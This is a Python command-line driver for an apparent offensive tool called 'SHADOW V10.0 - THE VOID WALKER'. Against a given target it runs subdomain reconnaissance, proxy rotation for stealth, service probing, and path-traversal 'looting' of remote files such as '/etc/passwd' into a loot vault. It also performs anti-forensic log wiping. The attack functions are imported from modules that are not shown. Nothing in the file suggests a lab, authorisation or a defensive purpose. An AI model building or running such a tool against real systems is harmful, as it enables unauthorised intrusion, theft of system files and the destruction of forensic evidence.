import argparse
import sys
import os
import json
from tools.devops.shadow_void_walker import shadow_recon_subdomains, shadow_stealth_rotator, polymorphic_payload_generator, shadow_loot_file, shadow_ghost_wipe
from tools.devops.probing import probe_service
from tools.devops.reporter import generate_shadow_report

def main():
    parser = argparse.ArgumentParser(description="SHADOW V10.0 - THE VOID WALKER SUPREME")
    parser.add_argument("--target", required=True, help="Target URL or IP")
    parser.add_argument("--auto", action="store_true", help="Launch Autonomous Void Walker Mission")
    parser.add_argument("--loot", help="Remote file path to loot via Path Traversal (e.g., '/etc/passwd')")
    parser.add_argument("--ghost", action="store_true", help="Enable Real Anti-Forensics (Shred/Truncate)")
    parser.add_argument("--stealth", action="store_true", help="Enable Real Proxy Rotation")
    args = parser.parse_args()
    
    print("█"*60)
    print(f" 👹 SHADOW V10.0 - THE VOID WALKER - SUPREME REALITY 👹")
    print("█"*60)
    
    findings = {}
    
    # 1. Real Recon (Active CRT.sh)
    print(f"[*] REAL RECON: {args.target}")
    findings['subdomains'] = shadow_recon_subdomains(args.target)
    
    # 2. Real Proxy Rotation
    if args.stealth:
        print("[!] REAL STEALTH: Fetching and verifying active proxies...")
        findings['stealth'] = shadow_stealth_rotator()
        
    # 3. Real Service Probing
    print(f"[*] REAL PROBE: Scanning {args.target}:80")
    findings['probe'] = probe_service(args.target, 80)
    
    # 4. Real Looting (Active Path Traversal)
    if args.loot:
        print(f"[!] REAL LOOTING: Attempting exfiltration of {args.loot} via Multi-Pattern Traversal...")
        findings['loot_result'] = shadow_loot_file(args.target, args.loot)
        
    # 5. Real Anti-Forensics (Active Shred/Truncate)
    if args.ghost:
        print("[!] REAL GHOST: Initiating military-grade log wiping (Shred/Truncate)...")
        findings['ghost_results'] = shadow_ghost_wipe()
        
    # 6. Report Generation
    report_path = generate_shadow_report(args.target, findings)
    print(f"[*] Supreme Reality Report V10.0: {report_path}")
    print(f"[*] Mission Complete. Check LOOT_VAULT/ for exfiltrated assets.")

if __name__ == "__main__":
    main()
